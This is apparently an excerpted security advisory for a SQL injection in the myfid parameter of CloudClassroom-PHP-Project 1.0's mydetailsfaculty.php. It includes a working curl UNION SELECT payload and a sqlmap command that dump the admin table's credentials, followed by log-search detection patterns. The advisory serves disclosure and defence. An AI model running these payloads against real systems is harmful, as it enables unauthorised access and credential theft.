# Security Advisory — SQL Injection in mydetailsfaculty.php (parameter myfid)

> **Identifier:** Pending CVE assignment / Internal ID **CC-2026-29**
...
A vulnerability was identified in **CloudClassroom-PHP-Project 1.0** (Vishal Mathur — `mathurvishal`), in the component **mydetailsfaculty.php**, that allows **an attacker (None (via Broken Access Control — item 00; design would require professor session); user interaction: None)** to exploit a **SQL Injection (UNION-based / error-based)** flaw.

Parameter `myfid` is interpolated in quotes in SELECT query. Closing the quote allows `UNION SELECT`. Target table exposes 9 columns. Confirmed with unauthenticated admin credential dump.
...
| Component: mydetailsfaculty.php | 1.0 | None | Affected |
...
The vulnerability occurs due to **SQL Injection (UNION-based / error-based)** in the component **mydetailsfaculty.php**.
...
1. Request `mydetailsfaculty.php` with `myfid` containing UNION payload (no cookie — item 00).
...
```http
POST /mydetailsfaculty.php HTTP/1.1
...
```bash
curl -s -G "http://192.168.95.131:9292/mydetailsfaculty.php" \
  --data-urlencode "myfid=' UNION SELECT 1,concat(0x5b,Aid,0x3a,Apass,0x5d),3,4,5,6,7,8,9 FROM admin -- -" | grep -oE "\[[^]]*:[^]]*\]"\n\nsqlmap -u "http://192.168.95.131:9292/mydetailsfaculty.php?myfid=1" -p myfid --batch --dump -T admin
```
...
3. Access the component **mydetailsfaculty.php** (parameter(s): myfid).
...
- Requests to `mydetailsfaculty.php` with `UNION`, `SELECT`, `extractvalue`, `concat`, single quotes or `-- ` in parameter `myfid`.
- Database error messages (e.g., `XPATH syntax error`, MariaDB/MySQL errors) reflected in responses.

### Example Log Search

```text
grep -Ei "(union|select|extractvalue|concat|<script|onerror|onload|</textarea)" access.log | grep "mydetailsfaculty.php"
```
